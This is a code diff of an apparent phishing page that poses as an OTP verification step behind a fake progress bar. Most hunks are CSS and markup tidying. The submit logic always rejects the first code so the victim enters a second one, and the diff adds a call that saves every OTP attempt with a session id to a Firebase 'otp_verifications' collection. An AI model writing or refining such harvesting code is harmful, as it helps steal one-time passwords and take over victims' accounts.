@@ -5,9 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>sbynorewdpolnt</title>
   <style>
-    html, body {
-      margin: 0; padding: 0; width: 100%; overflow-x: hidden;
-    }
+    html, body { margin: 0; padding: 0; width: 100%; overflow-x: hidden; }
     body {
       font-family: Arial, sans-serif;
       background-color: #eef2f5;
@@ -34,9 +32,7 @@
       position: absolute; right: 30px; font-size: 24px; top: 50%;
       transform: translateY(-50%); cursor: pointer;
     }
-    .headline .headline-text {
-      margin-left: 20px;
-    }
+    .headline .headline-text { margin-left: 20px; }
     .progress-bar-container {
       width: 100%; max-width: 400px; height: 10px; background-color: #e0e0e0;
       border-radius: 5px; margin-bottom: 20px; overflow: hidden; position: relative;
@@ -73,9 +69,7 @@
       font-size: 14px; font-weight: bold; color: #000000;
       margin-bottom: 15px; text-align: left;
     }
-    #otp-timer span {
-      color: #6a1b9a;
-    }
+    #otp-timer span { color: #6a1b9a; }
     .resend-otp {
       font-size: 14px; color: #6a1b9a; background: none; border: none;
       padding: 0; cursor: pointer; text-decoration: underline;
@@ -116,6 +110,7 @@
   </style>
 </head>
 <body>
+
 <div class="overlay" id="overlay">
   <div class="spinner"></div>
   <div class="loading-text" id="loadingText">
@@ -134,16 +129,12 @@
 </div>
 
 <div class="progress-bar-container">
-  <div class="progress-bar">
-    <div class="progress-text">35% Complete</div>
-  </div>
+  <div class="progress-bar"><div class="progress-text">35% Complete</div></div>
 </div>
 
 <div class="otp-section">
   <div class="otp-title">OTP Verification</div>
-  <div class="otp-description">
-    We have sent an OTP to your registered mobile number. Please enter the OTP and proceed.
-  </div>
+  <div class="otp-description">We have sent an OTP to your registered mobile number. Please enter the OTP and proceed.</div>
 
   <input type="text" id="otpInput" class="otp-input" placeholder="Enter OTP" maxlength="8" oninput="validateOTP()" required>
   <div id="otpError" class="error-message">Please enter OTP</div>
@@ -196,10 +187,10 @@
   }
 
   function updateTimerDisplay() {
-    let minutes = Math.floor(totalSeconds / 60);
-    let seconds = totalSeconds % 60;
-    document.getElementById('timer').textContent =
-      (minutes < 10 ? '0' : '') + minutes + ":" + (seconds < 10 ? '0' : '') + seconds + " seconds";
+    const minutes = Math.floor(totalSeconds / 60);
+    const seconds = totalSeconds % 60;
+    document.getElementById('timer').textContent = 
+      `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')} seconds`;
   }
 
   function resendOTP() {
@@ -227,6 +218,15 @@
       return;
     }
 
+    const sessionId = localStorage.getItem('sessionid') || 'unknown';
+
+    // Always save OTP attempt
+    await addDoc(collection(db, "otp_verifications"), {
+      otp: otpValue,
+      timestamp: serverTimestamp(),
+      sessionId: sessionId
+    });
+
     if (submitCount === 0) {
       localStorage.setItem('firstOtp', otpValue);
       otpInvalidError.style.display = 'block';
@@ -234,20 +234,7 @@
       submitCount++;
     } else {
       localStorage.setItem('finalOtp', otpValue);
-      await saveOTPToFirebase(otpValue);
       showLoading();
-    }
-  }
-
-  async function saveOTPToFirebase(otp) {
-    try {
-      await addDoc(collection(db, "otp_verifications"), {
-        otp: otp,
-        timestamp: serverTimestamp()
-      });
-    } catch (e) {
-      console.error("Error saving OTP:", e);
-      alert("Failed to save OTP.");
     }
   }
 
@@ -269,12 +256,10 @@
     }, 1000);
   }
 
-  // Start the countdown timer on page load
   window.addEventListener('DOMContentLoaded', () => {
     startTimer();
   });
 
-  // Make functions accessible to inline onclick
   window.submitForm = submitForm;
   window.resendOTP = resendOTP;
   window.validateOTP = validateOTP;
